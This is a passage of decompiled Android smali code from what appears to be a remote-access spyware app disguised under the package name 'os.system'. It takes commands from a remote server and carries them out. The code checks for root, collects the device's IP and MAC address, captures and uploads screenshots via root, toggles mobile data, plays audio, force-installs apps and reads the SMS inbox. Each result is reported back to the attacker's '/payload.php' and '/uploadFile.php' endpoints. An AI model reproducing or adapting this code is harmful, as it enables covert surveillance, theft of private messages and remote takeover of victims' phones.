    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "alert ditampilkan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 203
    const-string v2, "alert"

    const/4 v3, 0x1

    move-object/from16 v0, p1

    invoke-static {v0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 205
    :cond_5
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "cekroot"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 206
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v2

    .line 208
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "root:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 210
    :cond_6
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "status"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    .line 212
    const-string v2, ""

    .line 213
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-boolean v2, Los/system/ReceiverBoot;->installResult:Z

    if-nez v2, :cond_e

    .line 214
    const-string v2, "server belum terinstall"

    .line 218
    :goto_2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "root: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\nswitch: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    const-string v5, "swmain"

    const-string v6, ""

    .line 219
    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\nserver: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nipadrs: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x1

    .line 221
    invoke-static {v3}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nmacads: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "wlan0"

    .line 222
    invoke-static {v3}, Los/system/Identitas;->getMACAddress(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nbatery: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->batStatus:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 224
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 227
    :cond_7
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "layar"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 228
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/MainScreen;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 229
    const/high16 v3, 0x10000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 230
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 232
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "layar menyala"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 234
    :cond_8
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "screen"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    .line 235
    new-instance v2, Ljava/text/SimpleDateFormat;

    const-string v3, "HH:mm:ss"

    invoke-direct {v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    invoke-virtual {v2, v3}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 237
    const/4 v2, 0x1

    :try_start_0
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "screencap -p "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/screen.jpg"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    .line 238
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-virtual {v3, v2}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 239
    const-wide/16 v2, 0x1388

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 241
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/uploadFile.php"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 242
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const-string v2, "upload"

    sput-object v2, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 243
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/screen.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 244
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 247
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "screenshoot dan upload berhasil"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 256
    :cond_9
    :goto_3
    :try_start_1
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-net-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 257
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "hidup"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_f

    .line 258
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v2, 0x1

    move-object/from16 v0, p1

    invoke-static {v2, v0}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 266
    :cond_a
    :goto_4
    :try_start_2
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-out-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 267
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "utf"

    const/4 v5, 0x1

    aget-object v2, v2, v5

    invoke-interface {v3, v4, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 268
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 270
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    const-string v4, "utf"

    const-string v5, ""

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_16

    .line 275
    :goto_5
    :try_start_3
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-audio-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 277
    const/4 v3, 0x2

    aget-object v3, v2, v3

    const-string v4, "start"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    .line 278
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->audio(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 279
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "audio dijalankan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 288
    :goto_6
    :try_start_4
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-install-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 290
    const/4 v3, 0x1

    aget-object v3, v2, v3

    sput-object v3, Los/system/SystemThread;->install_app:Ljava/lang/String;

    .line 291
    const/4 v3, 0x2

    aget-object v3, v2, v3

    sput-object v3, Los/system/SystemThread;->install_paket:Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 293
    :try_start_5
    sget-object v3, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "nama asets: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v5, 0x3

    aget-object v5, v2, v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 295
    new-instance v3, Los/system/Installer;

    const/4 v4, 0x1

    move-object/from16 v0, p1

    invoke-direct {v3, v0, v4}, Los/system/Installer;-><init>(Landroid/content/Context;Z)V

    const/4 v4, 0x3

    aget-object v2, v2, v4

    const-string v4, "/sdcard/"

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v2, v4}, Los/system/Installer;->assetToSdcard(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 296
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "get assets success"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 302
    :goto_7
    :try_start_6
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->insHandler:Landroid/os/Handler;

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->insRefresh:Ljava/lang/Runnable;

    const-wide/16 v4, 0x1388

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 304
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "sedang paksa install aplikasi"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 309
    :goto_8
    :try_start_7
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-sms-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 310
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "baca"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1d

    .line 311
    new-instance v8, Ljava/lang/StringBuffer;

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    .line 313
    invoke-virtual/range {p0 .. p0}, Los/system/SystemThread;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    .line 314
    invoke-interface {v4}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_1c

    .line 316
    :cond_b
    const-string v3, ""

    .line 317
    const/4 v2, 0x0

    :goto_9
    invoke-interface {v4}, Landroid/database/Cursor;->getColumnCount()I

    move-result v5

    if-ge v2, v5, :cond_11

    .line 318
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-interface {v4, v2}, Landroid/database/Cursor;->getColumnName(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ":"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-interface {v4, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    move-result-object v3

    .line 317
    add-int/lit8 v2, v2, 0x1

    goto :goto_9

    .line 171
    :cond_c
    sget-object v2, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v3, ">>>>> super mati"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 172
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "swmain"

    sget-object v4, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 173
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

